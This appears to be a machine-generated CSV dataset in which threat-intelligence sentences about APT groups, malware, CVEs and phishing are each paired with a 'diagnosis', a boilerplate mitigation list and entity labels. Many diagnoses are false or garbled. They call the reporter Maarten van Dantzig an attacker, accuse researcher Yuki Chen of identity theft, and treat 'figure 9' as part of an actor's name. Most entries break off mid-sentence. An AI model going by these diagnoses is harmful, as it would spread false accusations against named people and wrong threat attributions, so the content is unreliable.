4818,"consistent with cert-ua reporting, tag observed multiple russian gru actors - apt28 and sandworm - conduct campaigns exploiting the follina vulnerability.",diagnosis: the entity (identity) in the second column is likely a victim of a cyber attack by the threat actors (apt28 and sandworm) exploiting the follina vulnerability (vulnerability) as indicated in the third column relationship that,1. patching and updating systems to fix the follina vulnerability. 2. implementing strong access controls and authentication measures to prevent unauthorized access. 3. deploying intrusion detection and prevention systems to detect and block any suspicious activity. 4. conducting regular security assessments and audits to identify and remediate any vulnerabilities. 5. educating employees on cybersecurity best practices and the importance of being vigilant against potential threats. 6. implementing a threat intelligence program to stay up-to-date on emerging threats and,identity,identity,threat-actor
234,"we monitored a list of 50 legitimate ukraine-related domains (e.g., popular news and donation websites) and keywords (e.g., ukraine, refugee) as targets for cybersquatting.",the diagnosis is that the entity located in ukraine is being targeted by cybersquatting attacks through the use of legitimate domains and keywords related to ukraine and refugees. the relationship between the attack-pattern entity and the location entity suggests that the attackers are specifically targeting,1. implementing a comprehensive domain monitoring system to detect any new domains that may be registered using the entity's name or related keywords. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate any weaknesses in the entity's network and systems. 3. educating employees about the risks of phishing and social engineering attacks and implementing strict security protocols to prevent unauthorized access to sensitive data. 4. using a reputable domain registrar and implementing domain name system (dns) security extensions to prevent domain hij,location,location,attack-pattern
3830,"if koadic finds that the system is conducive to the attacker’s interests, it downloads a base64-encrypted version of the anel malware from the command-and-control (c&c) server and executes it. encrypted anel is decrypted using the “certutil -docode” command.","the entity is a system and the cybersecurity issue is the presence of anel malware. the relationship between the system and the malware is that the malware is downloaded onto the system. therefore, the diagnosis is a malware infection caused by a successful download from a",1. install and regularly update antivirus software to detect and remove anel malware. 2. implement firewalls to block unauthorized access to the system and prevent malware downloads. 3. educate users on safe browsing practices and the risks of downloading untrusted files or software. 4. conduct regular system scans and vulnerability assessments to identify and address potential security gaps. 5. implement access controls and authentication measures to limit system access to authorized users only. 6. use intrusion detection and prevention systems to detect and block malware,malware,malware,malware
2365,"for those interested in following our in-the-wild work, we will soon publish details surrounding another, unrelated campaign we discovered using two chrome 0-days (cve-2021-37973 and cve-2021-37976).",the diagnosis is that there are two vulnerabilities (cve-2021-37973 and cve-2021-37976) in the chrome software (entity) that were discovered during an in-the-wild campaign. the relationship between the vulnerabilities and the,"1. patch management: ensure that all software is up-to-date with the latest security patches, including chrome software. 2. network segmentation: use network segmentation to isolate critical systems and limit the spread of malware or attacks. 3. user awareness training: educate users on how to recognize and avoid phishing attempts, malicious websites, and suspicious email attachments. 4. endpoint protection: deploy endpoint protection solutions that can detect and block malicious activity, including malware and exploits. 5. threat intelligence: leverage",vulnerability,SOFTWARE,vulnerability
14071,"figure 9 shows that slub used “windows-rt-kb-2937636.dll,” while freenki used “windows-kb275122-x86.exe.” figure 9 naming convention for persistence.","slub and freenki are both using windows vulnerabilities to persist in the system, indicating a potential cyber attack or breach. the relationship between the two entities is that they both use different files to achieve persistence, suggesting that they may be part of the","1. patching and updating windows operating system to address vulnerabilities that slub and freenki are exploiting. 2. implementing intrusion detection and prevention systems to detect and block malicious activities related to slub and freenki. 3. conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the system. 4. implementing endpoint protection solutions that can detect and block malware, including slub and freenki. 5. implementing access controls and network segmentation to limit the",FILEPATH,FILEPATH,malware
1584,reports indicate that it harvests credentials using mimikatz and maarten van dantzig reports it also uses common hardcoded credentials to spread.,credential harvesting and use of hardcoded credentials are being used by an attacker (entity: maarten van dantzig) to spread malware (entity: tools) through an identified attack pattern. the diagnosis is a potential data breach and compromised systems.,1. implement two-factor authentication to prevent credential harvesting and use of hardcoded credentials. 2. regularly update and change passwords to prevent attackers from using hardcoded credentials. 3. conduct regular security awareness training for employees to prevent phishing attacks and other social engineering tactics used for credential harvesting. 4. use intrusion detection and prevention systems to detect and block malicious traffic. 5. implement endpoint protection solutions to prevent malware from spreading and compromising systems. 6. conduct regular vulnerability assessments and penetration testing to identify and address potential vulnerabilities,tools,identity,attack-pattern
3558,"examining the capesand samples the simplified diagram taken from the previous blog shows the combination of confuserex and cassandra via the second layer of obfuscation protection, which involves the dll cyax_sharp assembly (both cyax_sharp and cyax are part of the cassandra protector).","the diagnosis is that there is a malware issue involving capesand samples. the malware is using tools such as confuserex and cassandra, which are connected through a second layer of obfuscation protection involving the dll cyax_sharp assembly.",1. implementing advanced anti-malware software with real-time scanning capabilities to detect and remove capesand samples and other malware. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network that could be exploited by malware. 3. implementing a robust firewall solution with strict access controls and traffic filtering to prevent unauthorized access and block malicious traffic. 4. implementing endpoint protection solutions that can detect and prevent the execution of malicious code on endpoints. 5. conduct,malware,tools,tools
5057,"however, for the first time, tag has observed coldriver campaigns targeting the military of multiple eastern european countries, as well as a nato centre of excellence.","the diagnosis is that the military of multiple eastern european countries and a nato centre of excellence are being targeted by coldriver campaigns, which are being carried out by a threat actor. there is a need for increased cybersecurity measures to protect these entities from further",1. implementing multi-factor authentication for all users accessing sensitive information. 2. conducting regular security awareness training for employees to identify and respond to phishing attacks. 3. deploying advanced threat intelligence solutions to detect and respond to coldriver campaigns. 4. implementing network segmentation to limit the spread of malware in case of a successful attack. 5. regularly conducting vulnerability assessments and penetration testing to identify and remediate potential security weaknesses. 6. implementing endpoint protection solutions to detect and prevent malware,identity,identity,threat-actor
2427,"early in 2010, cve-2010-1622 was assigned to a remote code execution vulnerability in the spring framework.","the diagnosis is that the spring framework software is vulnerable to remote code execution due to the cve-2010-1622 vulnerability, which can be exploited using an attack pattern.",1. apply the latest security patches and updates to the spring framework software to mitigate the cve-2010-1622 vulnerability. 2. implement network segmentation and access controls to limit the exposure of the spring framework software to potential attackers. 3. deploy intrusion detection and prevention systems (idps) to detect and block any attempts to exploit the cve-2010-1622 vulnerability. 4. conduct regular vulnerability assessments and penetration testing to identify and remediate any other potential vulnerabilities in the spring framework software,vulnerability,SOFTWARE,attack-pattern
13146,"tropic trooper, a threat actor group that targets government, military, healthcare, transportation, and high-tech industries in taiwan, the philippines, and hong kong, has been active since 2011.","the diagnosis is a targeted cyber attack by tropic trooper, a threat actor group, on various industries in taiwan, the philippines, and hong kong. the group has been active since 2011 and targets government, military, healthcare, transportation,","1. implementing a robust cybersecurity framework that includes firewalls, intrusion detection and prevention systems, and endpoint protection to prevent tropic trooper from infiltrating the network. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network. 3. educating employees on cybersecurity best practices, such as not clicking on suspicious links or opening attachments from unknown sources, to prevent social engineering attacks. 4. implementing multi-factor authentication to prevent unauthorized access to sensitive data and systems",identity,location,TIME
3502,"based on the controller’s behavior, we can posit that both marade and protux were authored by the same threat actors.","the diagnosis for this cybersecurity issue is that both marade and protux are variants of the same malware, which was authored by the same threat actors.","1. implement advanced threat detection technologies that can identify and analyze the behavior of malware variants in real-time. 2. deploy endpoint security solutions that can detect and block malware infections, including variants of known threats. 3. develop and implement a threat intelligence program that constantly monitors and analyzes the latest cyber threats and trends, and shares this information with relevant stakeholders. 4. conduct regular security assessments and penetration testing to identify vulnerabilities and weaknesses in the organization's network and systems. 5. train employees on cybersecurity best practices",malware,malware,
1359,"using our poc, we created the following demonstration video of how a malicious actor would exploit the cve-2021-32648 vulnerability, log into the compromised octobercms account and to deface a web page hosted by the server:",the diagnosis is that there is a vulnerability (cve-2021-32648) in the software entity (octobercms) which allows a malicious actor to exploit it and gain access to a compromised account. this compromised account is then used to deface,"1. patching: one potential solution is to apply the latest security patch released by octobercms to address the vulnerability (cve-2021-32648) and prevent malicious actors from exploiting it. 2. multi-factor authentication (mfa): implementing mfa can add an extra layer of security to the compromised account, making it harder for malicious actors to gain access even if they have the login credentials. 3. access control: limiting access to the compromised account to only authorized personnel can",vulnerability,SOFTWARE,
14221,"when it is loaded by the system, dllmain decrypts the payload via cryptunprotectdata.",the diagnosis for this cybersecurity issue is that the malware entity is using the tools entity to decrypt its payload via cryptunprotectdata when it is loaded by the system. this suggests that the malware is attempting to evade detection and execute malicious actions on the system,"1. implementing behavioral analysis tools to detect and identify suspicious activity, such as the use of cryptunprotectdata by the malware entity. 2. deploying endpoint protection solutions that can detect and block the execution of malicious payloads, including those that employ cryptunprotectdata. 3. conducting regular vulnerability assessments and patching any vulnerabilities in the system that could be exploited by the malware. 4. implementing strict access controls and user permissions to prevent unauthorized access to sensitive data and systems. 5.",tools,malware,
2561,"we do believe there is evidence suggestive of a connection between shamoon 2 and the magic hound campaign, which could indicate these two attack campaigns could have worked in conjunction with each other to execute the shamoon 2 attacks.","possible diagnosis: the entities involved in this cybersecurity issue are two attack campaigns, shamoon 2 and magic hound, which may have worked together to execute the shamoon 2 attacks. the relationship between these entities is suggestive of a connection, which",1. implementing network segmentation to limit the spread of malware in case of a breach. 2. conducting regular vulnerability assessments and penetration testing to identify and mitigate potential security gaps. 3. deploying endpoint protection solutions to detect and block malicious activities on devices. 4. using threat intelligence feeds to stay updated on emerging threats and attack campaigns. 5. implementing multi-factor authentication and access controls to prevent unauthorized access to critical systems and data. 6. conducting security awareness training for employees to prevent social,campaign,campaign,campaign
1872,"avast responded to our notification with this statement: ""we can confirm the vulnerability in an old version of our driver aswarpot.sys, which we fixed in our avast 21.5 released in june 2021.",diagnosis: vulnerability in an old version of avast's driver aswarpot.sys was found and fixed in avast 21.5 released in june 2021. the vulnerability consisted of a file path and was part of the software,"1. regular software updates: to prevent vulnerabilities like the one found in avast's driver, it is important to regularly update software to the latest version. this ensures that any known vulnerabilities have been fixed and the software is running on the latest security protocols. 2. vulnerability scanning: conducting regular vulnerability scans can help identify any potential security weaknesses in the system. this can help detect vulnerabilities like the one found in avast's driver and allow for timely action to be taken. 3. implementing",FILEPATH,SOFTWARE,TIME
4573,"coldriver, a russian-based threat actor sometimes referred to as callisto, continues to send credential phishing emails to targets including government and defense officials, politicians, ngos and think tanks, and journalists.","the diagnosis is a credential phishing attack by the threat actor coldriver (also known as callisto) targeting government and defense officials, politicians, ngos and think tanks, and journalists. the attack pattern involves sending phishing emails to steal login credentials.","1. implement multi-factor authentication (mfa) to add an extra layer of security to login credentials. 2. train employees on how to identify and avoid phishing emails. 3. use anti-phishing software that can detect and block phishing emails before they reach the intended recipient. 4. conduct regular security audits to identify vulnerabilities and address them promptly. 5. use email authentication protocols such as spf, dkim, and dmarc to prevent email spoofing. 6. monitor network traffic for suspicious activity and",threat-actor,threat-actor,attack-pattern
4930,"in this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: apt35, an iranian group, which regularly conducts phishing campaigns targeting high risk users.","apt35, an iranian threat actor, is conducting phishing campaigns targeting high risk users located in a specific location. this suggests a potential state-sponsored cyber espionage campaign. a diagnosis could be that the targeted location is of strategic interest to the iranian government and a",1. implementing multi-factor authentication (mfa) for high-risk users to prevent unauthorized access to their accounts. 2. conducting regular security awareness training for employees to identify and avoid phishing attempts. 3. deploying advanced threat detection and response solutions to detect and mitigate apt35's activities. 4. implementing network segmentation to limit the lateral movement of apt35 within the network. 5. enhancing endpoint security by deploying anti-malware and endpoint detection and response (edr),threat-actor,location,
1986,this post is also available in: 日本語 (japanese) helloxd is a ransomware family performing double extortion attacks that surfaced in november 2021.,"diagnosis: helloxd ransomware family is using double extortion attacks as a cyber attack pattern, which is a type of malware. the attack surfaced in november 2021 and targeted an entity identified by the time label. the malware uses the attack pattern",1. regularly update and patch all software and operating systems to prevent vulnerabilities that can be exploited by ransomware. 2. implement multi-factor authentication to prevent unauthorized access to systems and data. 3. train employees on how to identify and avoid phishing emails and other social engineering tactics used by ransomware attackers. 4. implement network segmentation to limit the spread of ransomware in case of an attack. 5. regularly backup all important data and store it in a secure location that is not connected to the,malware,TIME,attack-pattern
3798,"when we tracked chessmaster back in november, we noted that it exploited the soap wsdl parser vulnerability cve-2017-8759 (patched in september 2017) within the microsoft .net framework to download additional malware.","the entity (software) had a vulnerability (cve-2017-8759) that was exploited by malware (chessmaster) to download additional malware, indicating a potential compromise of the entity's security.",1. patching the vulnerability: the first and most important step is to patch the vulnerability that was exploited by the malware. the entity should update their software to the latest version and ensure that all security patches are applied. 2. implementing intrusion detection systems (ids): ids can monitor network traffic and identify any suspicious activity. this can help detect malware before it can cause any damage. 3. regular vulnerability scanning: regular vulnerability scanning can help identify any vulnerabilities in the entity's system and software.,malware,TIME,vulnerability
3730,"on april 6, 2022, vmware published a security advisory mentioning eight vulnerabilities, including cve-2022-22954 and cve-2022-22960 impacting their products vmware workspace one access, identity manager and vrealize automation.","the diagnosis is that vmware workspace one access, identity manager, and vrealize automation are vulnerable to eight cybersecurity vulnerabilities, including cve-2022-22954 and cve-2022-22960, as reported in a security advisory published by vmware",1. patching and updating the affected software to the latest version to fix the vulnerabilities. 2. implementing network segmentation to isolate vulnerable systems and reduce the attack surface. 3. implementing multi-factor authentication (mfa) to add an additional layer of security to the authentication process. 4. conducting regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities. 5. implementing intrusion detection and prevention systems (idps) to detect and prevent any unauthorized access or activity. 6.,vulnerability,vulnerability,SOFTWARE
3971,"as observed on cve-2020-0688, the use of static keys — as opposed to randomly generated keys — can allow an attacker to execute arbitrary code by tricking the server into deserializing viewstate data.","the entity is a server and the cybersecurity issue is a vulnerability in which the use of static keys can allow an attacker to execute arbitrary code. the relationship between the entities is that the vulnerability is used by an attack pattern. therefore, the diagnosis is that","the server is susceptible to a static key vulnerability that can be exploited by an attacker to execute arbitrary code using a specific attack pattern. potential cybersecurity solutions to address this diagnosis could include: 1. implementing dynamic key exchange protocols: by using dynamic key exchange protocols, the server can generate a new key for each session, making it much harder for attackers to exploit a static key vulnerability. 2. regularly updating software and security patches: regularly updating software and security patches can help to remediate known vulnerabilities",vulnerability,attack-pattern,
3528,"protux’s latest version, 3.7, uses the open-source compiler opencsp to generate a session key with the rsa algorithm.","the diagnosis is that there is a potential vulnerability in protux's latest version, 3.7, due to its use of the open-source compiler opencsp to generate a session key with the rsa algorithm. this vulnerability is related to the fact","1. update the version of protux to a more secure version that does not use opencsp or has patched this vulnerability. 2. implement a different algorithm for generating session keys that is not vulnerable to this type of attack. 3. conduct a thorough security audit of the entire system to identify any other potential vulnerabilities. 4. implement multi-factor authentication to add an extra layer of security to the system. 5. train employees on best practices for cybersecurity, such as avoiding suspicious emails and using strong passwords",malware,tools,
1757,"and before long, yuki chen (@guhe120), a chinese researcher, posted his answer.","identity theft, where yuki chen (@guhe120) is posing as someone else, and location tracking, where the researcher is located at a certain place, are the cybersecurity issues. the relationship between the entities is that yuki chen is posing as","1. implement multi-factor authentication to prevent identity theft by requiring additional verification steps beyond just a password. 2. use encryption to protect sensitive data such as location information, making it more difficult for attackers to intercept and exploit. 3. utilize geofencing technology to restrict access to certain sensitive information or systems based on the user's physical location. 4. regularly monitor and analyze network activity to identify any suspicious behavior or unauthorized access attempts. 5. educate employees and individuals on the risks of identity",identity,identity,location
5411,"the vendors that were targeted by vpnfilter were asus, d-link, huawei, linksys, mikrotik, netgear, qnap, tp-link, ubiquiti, upvel, and zde.","diagnosis: the cybersecurity issue is the vpnfilter malware. the entities involved are the vendors asus, d-link, huawei, linksys, mikrotik, netgear, qnap, tp-link, ubiquiti, up","1. update firmware: vendors should release firmware updates to patch vulnerabilities and protect against vpnfilter malware. 2. disable remote management: users should disable remote management on their routers to prevent unauthorized access. 3. change default passwords: users should change default passwords to strong, unique passwords to prevent brute-force attacks. 4. use vpn: users should use a vpn to encrypt internet traffic and prevent vpnfilter malware from intercepting data. 5. implement intrusion detection and prevention systems: organizations should implement intrusion detection",identity,identity,identity
3417,biopass rat loader backdoor.win64.biopass.a d18d84d32a340d20ab07a36f9e4b959495ecd88d7b0e9799399fcc4e959f536b flash_installer.exe,the entity 'flash_installer.exe' has been identified as a victim of the cybersecurity issue 'biopass rat loader backdoor.win64.biopass.a'. the relationship between the two entities is that the file 'flash_installer.exe',1. use anti-virus software to detect and remove the 'biopass rat loader backdoor.win64.biopass.a' malware from the system. 2. implement firewalls to prevent unauthorized access to the system and block any suspicious traffic. 3. use intrusion detection and prevention systems to identify and prevent any potential attacks. 4. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the system's security. 5. implement strong password policies and multi-factor authentication to prevent,malware,hash,malware
2013,"for example, lockbit 2.0 leverages tox chat for threat actor communications.",potential diagnosis: lockbit 2.0 malware is utilizing tox chat tools for communication between threat actors. this highlights the importance of monitoring and securing communication channels to prevent cyber attacks.,"1. implementing a robust network security solution that includes firewalls, intrusion detection and prevention systems, and endpoint security tools to prevent lockbit 2.0 malware from infiltrating the network. 2. conducting regular security audits and vulnerability assessments to identify and address any weaknesses in the communication channels that could be exploited by threat actors. 3. enforcing strict security policies and access controls to ensure that only authorized personnel have access to sensitive data and communication channels. 4. deploying advanced threat intelligence solutions",malware,tools,
354,trustedsec reports on how attackers were apparently able to glean user credentials from a certain device via the heartbleed vulnerability and use them to log in via a vpn.,"the diagnosis is a successful exploitation of the heartbleed vulnerability, which allowed attackers to obtain user credentials from a device. the attackers then used these credentials to log in via a vpn. the entities involved are the identity (user credentials), vulnerability (heart","1. patching the heartbleed vulnerability: this involves updating the affected device with the latest security patches to fix the vulnerability and prevent attackers from exploiting it in the future. 2. multi-factor authentication: this involves using an additional layer of security, such as a one-time password or biometric authentication, to verify the identity of users logging in via a vpn. this can help prevent unauthorized access even if attackers have obtained user credentials. 3. user education and awareness: educating users about the risks",identity,vulnerability,tools
2845,the wanacrypt0r ransomware spreads itself by heavily scanning over tcp port 445 (associated with smb) and attempting to exploit the eternalblue vulnerability on systems.,"the diagnosis is that the entity is vulnerable systems and the relationship between entities is that the malware is exploiting the vulnerability through the use of tcp port 445. the specific issue is the presence of the wanacrypt0r ransomware, which is spreading","1. implement regular software updates and security patches to address vulnerabilities in the system and prevent exploitation by malware. 2. use a firewall to block unauthorized access to tcp port 445 and other vulnerable ports. 3. deploy antivirus and anti-malware software to detect and remove any malicious software, including wanacrypt0r ransomware. 4. conduct regular security audits and risk assessments to identify potential vulnerabilities and take proactive measures to mitigate them. 5. implement network segmentation to isolate critical systems from potential threats",malware,vulnerability,
4562,"based on our analysis, we believe that the stopwar app was developed by pro-ukrainian developers and was the inspiration for what turla actors based their fake cyberazov dos app off of.","the diagnosis is that the stopwar app was developed by pro-ukrainian developers and served as the inspiration for turla actors to create their fake cyberazov dos app, which was also a form of malware. the relationship between the",1. implement strict security protocols and guidelines for app development to prevent unauthorized access and use of app code by malicious actors. 2. conduct thorough background checks and vetting of app developers to ensure they do not have any ties to malicious organizations or groups. 3. regularly monitor and analyze app usage data to detect any suspicious activity or patterns that may indicate the presence of malware. 4. implement multi-factor authentication and access controls to prevent unauthorized access to app code and data. 5. use advanced threat intelligence,malware,threat-actor,malware
4873,"in 2014, microsoft filed a civil suit against the developer, mohammed benabdellah, for the development and dissemination of h-worm.",diagnosis: malware development and dissemination entity: mohammed benabdellah relationship: authored-by h-worm malware,"1. implement regular security audits and vulnerability assessments to detect and prevent malware development and dissemination. 2. use advanced threat intelligence solutions to monitor and identify potential malware threats. 3. implement strict access controls and permissions to prevent unauthorized access to sensitive systems and data. 4. train employees on cybersecurity best practices and the risks associated with malware, including how to identify and report suspicious activity. 5. deploy advanced endpoint protection solutions that can detect and prevent malware infections. 6. establish incident response plans and procedures to quickly",TIME,identity,malware
14296,maikspy on the windows platform figure 7.,the diagnosis is that maikspy malware is targeting the windows platform.,1. install antivirus software and keep it updated to detect and remove any instances of maikspy malware. 2. implement a strong firewall to prevent unauthorized access to the windows platform. 3. conduct regular vulnerability assessments and patch any identified vulnerabilities to prevent exploitation by maikspy malware. 4. educate users on safe browsing habits and avoid clicking on suspicious links or downloading unknown attachments. 5. implement two-factor authentication to prevent unauthorized access to the windows platform. 6. monitor network traffic and log activities to,malware,SOFTWARE,
3624,a good example of a generalized phishing campaign is the blank slate campaign we wrote about in march 2017.,phishing attack on blank slate campaign using the attack pattern.,"1. implementing two-factor authentication for all users to prevent unauthorized access to accounts. 2. conducting regular cybersecurity awareness training for employees, especially on how to identify and avoid phishing attacks. 3. deploying anti-phishing software and email filters to detect and block phishing emails before they reach users' inboxes. 4. enforcing strict password policies, such as requiring complex passwords and regular password changes. 5. conducting regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities in the",campaign,TIME,attack-pattern
876,analysis sample pclock2 is written in visual basic.,"the diagnosis is that the entity identified as ""pclock2"" has been infected with malware. the malware is written in visual basic and is using the ""software"" entity to carry out its malicious activities. this indicates that the malware is leveraging existing software",1. install and regularly update antivirus software to detect and remove malware. 2. conduct regular vulnerability assessments and patch any vulnerabilities found in existing software. 3. implement network segmentation to isolate infected devices and prevent the spread of malware. 4. use intrusion detection and prevention systems to monitor network traffic and detect any suspicious activity. 5. educate employees on safe browsing habits and the dangers of downloading and installing unverified software. 6. implement a software restriction policy to prevent the execution of unauthorized software. 7.,SOFTWARE,malware,
4552,this is the first known instance of turla distributing android-related malware.,diagnosis: turla threat actor is targeting software entities by distributing android-related malware.,"1. implementing strict access controls and authentication mechanisms to prevent unauthorized access to software entities. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security weaknesses in software systems. 3. deploying advanced threat detection and prevention tools, such as intrusion detection systems (ids), to detect and block turla threat actor's malware. 4. developing and enforcing comprehensive security policies and procedures, including data encryption and backup protocols, to ensure the protection of sensitive information. 5. providing regular",threat-actor,SOFTWARE,
1942,"the decoy documents tell more about urpage's possible targets, as it contains text from articles about the region of kashmir.","possible diagnosis: the threat actor (urpage) may be targeting the location of kashmir, as evidenced by the decoy documents containing text about the region. the relationship between the entities suggests that the threat actor is considering kashmir as a potential target. this",1. implement a comprehensive threat intelligence program to monitor for any suspicious activity related to kashmir and urpage. 2. deploy advanced anti-malware solutions that can detect and prevent any attempts by urpage to infiltrate systems in the kashmir region. 3. conduct regular security awareness training for employees in the kashmir region to ensure they are aware of the potential threat from urpage. 4. implement strict access controls and authentication protocols to limit access to sensitive data and systems in the kashmir region. 5. conduct,threat-actor,location,
231,"a phishing webpage targeting a ukrainian state administration employee, detected by our in-house machine learning models on march 16.our teams at palo alto networks are actively monitoring the phishing landscape surrounding ukraine-related urls and are sharing this threat intelligence with relevant authorities in ukraine and internationally.","diagnosis: phishing attack entity: ukrainian state administration employee relationship: the phishing webpage targets the employee (targets), and the location of the attack is related to ukraine (targets).","1. employee training and awareness programs to help them identify and report phishing emails and websites. 2. implementing multi-factor authentication to reduce the risk of unauthorized access to accounts. 3. deploying anti-phishing software and tools that can detect and block suspicious emails and websites. 4. conducting regular security audits to identify vulnerabilities and improve security measures. 5. implementing strict access controls and permissions to limit the exposure of sensitive information. 6. encouraging the use of strong and unique passwords,",attack-pattern,attack-pattern,identity
1479,"in addition to our research, the baidu security team in china recently found 23 mobile banking apps sharing the same certificate hosted by a third party app developer and reported the discovery to the cncert in china.","the diagnosis is that there is a potential security risk due to the use of the same certificate by multiple mobile banking apps hosted by a third party app developer. the entities involved are the baidu security team in china, the third party app developer (identity",1. implement a strict certificate management policy that prohibits the use of the same certificate by multiple mobile banking apps. this policy should be enforced by both the baidu security team and the third party app developer. 2. conduct regular security audits of the third party app developer's infrastructure and systems to identify any potential security risks or vulnerabilities. 3. implement multi-factor authentication for all mobile banking apps to add an extra layer of security and prevent unauthorized access. 4. implement encryption for all data transmitted between mobile banking,location,location,identity
2285,"parallel to the analysis, tracking, and technical disruption of this botnet, google has filed a lawsuit against two individuals believed to be located in russia for operating the glupteba botnet and its various criminal schemes.",diagnosis: the cybersecurity issue is the operation of the glupteba botnet and its various criminal schemes. the entity involved is two individuals believed to be located in russia. the relationship between the entities is that the individuals are located where the botnet,1. implementing network segmentation to isolate infected systems and prevent the spread of the botnet. 2. deploying advanced threat detection and response tools to identify and mitigate botnet activity. 3. utilizing threat intelligence feeds to stay updated on the latest tactics and techniques used by the botnet operators. 4. conducting regular security awareness training for employees to prevent social engineering attacks that may be used to spread the botnet. 5. working with law enforcement agencies to investigate and prosecute the individuals responsible for,identity,malware,location
3179,we also found several clues that show how the malware might be connected with the winnti group(also known as apt41).,"diagnosis: the cybersecurity issue is malware connected with the winnti group (also known as apt41). the entities involved are two threat actors. the relationship between the entities is a duplicate-of, indicating that the two threat actors are likely the",1. implementing a strong and up-to-date antivirus software to detect and remove malware associated with the winnti group. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security gaps that may be exploited by the winnti group. 3. implementing network segmentation to limit the spread of malware in case of a breach. 4. enhancing employee awareness and training to prevent social engineering attacks that may be used by the winnti group to gain access to sensitive information,threat-actor,threat-actor,
4082,"during our investigation into earth centaurs activities, we found that it also uses another backdoor called lilith rat.","the threat actor earth centaurs is using the lilith rat malware as a backdoor, indicating a potential security breach.",1. implementing a robust anti-malware software suite that can detect and remove the lilith rat malware and other similar threats. 2. conducting regular vulnerability assessments and penetration testing to identify potential security gaps and address them proactively. 3. implementing a comprehensive network segmentation strategy to limit the spread of malware and isolate infected systems. 4. implementing strict access controls and authentication protocols to prevent unauthorized access to sensitive data and systems. 5. conducting regular security awareness training sessions for employees to,threat-actor,malware,
13913,"it is interesting to note that darkside’s ransom note is similar to that of babuk, which might indicate that these two families share a link.","possible diagnosis: darkside and babuk may be related malware families, possibly sharing code or tactics. this could suggest that the same threat actors or groups are behind both, or that they have collaborated in some way. further investigation is needed to confirm this","1. conduct a thorough investigation of both malware families to identify any similarities in code, tactics, or infrastructure. 2. utilize threat intelligence tools and services to monitor and analyze any potential connections or collaborations between threat actors or groups. 3. implement network segmentation and access controls to limit the spread of malware and prevent lateral movement within the network. 4. regularly update and patch systems to address known vulnerabilities that could be exploited by these malware families. 5. train employees on cybersecurity best practices, such as",malware,malware,
2064,this particular ip was linked to a contabo server that x4k had also included within their virustotal graph discussed above.,"the identity entity (x4k) has a relationship with the threat-actor entity (linked to a particular ip) through the use of a contabo server. this suggests that x4k may be involved in cyber attacks or other malicious activities,","1. implementing a threat intelligence platform that can detect and alert on suspicious activity involving the contabo server and the linked ip address. 2. conducting regular network scans and vulnerability assessments to identify and address any potential security weaknesses that could be exploited by threat actors. 3. implementing multi-factor authentication and access controls to limit the ability of malicious actors to gain access to sensitive systems and data. 4. educating employees on the importance of cybersecurity best practices, such as strong password management and avoiding suspicious",threat-actor,identity,SOFTWARE
13545,"the water pamola attack chain after further searching, we noticed that an online store administrator asked about a strange online order that contains javascript code inserted into the field where the customer’s address or company name would normally be located.","the diagnosis is a water pamola attack targeting an online store. the attacker inserted javascript code into the customer information field, possibly to steal sensitive data or gain unauthorized access to the store's systems. the attack campaign was identified and linked to the attacker's","1. implementing a web application firewall (waf) to detect and block malicious traffic, including water pamola attacks. 2. conducting regular vulnerability assessments and penetration testing to identify potential vulnerabilities in the online store's systems and applications. 3. implementing multi-factor authentication for accessing sensitive data and systems to prevent unauthorized access. 4. using encryption to secure sensitive data such as customer information and payment details. 5. implementing a security information and event management (siem) system to detect and",campaign,identity,attack-pattern
3469,"if the affected system can connect online and doesn’t have av software, marade will connect to a blackgear-controlled public blog or social media post to retrieve an encrypted c&c configuration.",the diagnosis is a c&c (command and control) attack by a threat actor using malware to control infrastructure. the malware is designed to connect to a blackgear-controlled public blog or social media post to retrieve an encrypted c&c configuration. the infrastructure is,1. implementing network segmentation to isolate critical infrastructure from the rest of the network and limiting access to sensitive information. 2. deploying advanced threat detection and prevention systems that can detect and block c&c traffic. 3. conducting regular vulnerability assessments and patch management to ensure that all software and systems are up-to-date and secure. 4. implementing multi-factor authentication for all network access to prevent unauthorized access to critical systems. 5. conducting regular security awareness training for all employees to educate them on,Infrastucture,malware,threat-actor
14259,related hashes (sha256) detected as bkdr64_winnti.onm: 06b077e31a6f339c4f3b1f61ba9a6a6ba827afe52ed5bed6a6bf56bf18a279ba — cryptbase.dll 1e63a7186886deea6c4e5c2a329eab76a60be3a65bca1ba9ed6e71f9a46b7e9d – loadperf.dll 7c37ebb96c54d5d8ea232951ccf56cb1d029facdd6b730f80ca2ad566f6c5d9b – loadoerf.ini 9d04ef8708cf030b9688bf3e8287c1790023a76374e43bd332178e212420f9fb — wbemcomn.ini b1a0d0508ee932bbf91625330d2136f33344ed70cb25f7e64be0620d32c4b9e2 — cryptbase.ini e5273b72c853f12b77a11e9c08ae6432fabbb32238ac487af2fb959a6cc26089 — wbemcomn.dll tags malware | apt & targeted attacks | endpoints | research,"malware infection through related hashes (sha256) detected as bkdr64_winnti.onm in multiple files including cryptbase.dll, loadperf.dll, loadoerf.ini, wbemcomn.ini, cryptbase.ini, and wb",1. implementing robust anti-malware software that can detect and remove bkdr64_winnti.onm and other similar malware infections. 2. regularly updating the operating system and applications to ensure that any security vulnerabilities are patched and cannot be exploited by malware. 3. conducting regular security audits to identify potential vulnerabilities and take proactive measures to mitigate them. 4. implementing network segmentation to prevent malware from spreading across the network. 5. educating employees on best practices for avoiding malware infections,FILEPATH,FILEPATH,FILEPATH
3530,different versions of protux used by blackgear figure 9.,"blackgear figure 9 is using different versions of protux malware, indicating a possible attempt to evade detection and increase the effectiveness of their attacks. the use of multiple versions of the same malware suggests a sophisticated threat actor with advanced capabilities and access to resources",1. implement advanced threat detection systems that can identify and track the use of multiple versions of the same malware. 2. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the system that can be exploited by threat actors. 3. use endpoint protection solutions that can detect and prevent the installation and execution of malware. 4. implement strong access controls and authentication mechanisms to prevent unauthorized access to sensitive systems and data. 5. conduct regular security awareness training for employees to educate them about the latest,malware,threat-actor,
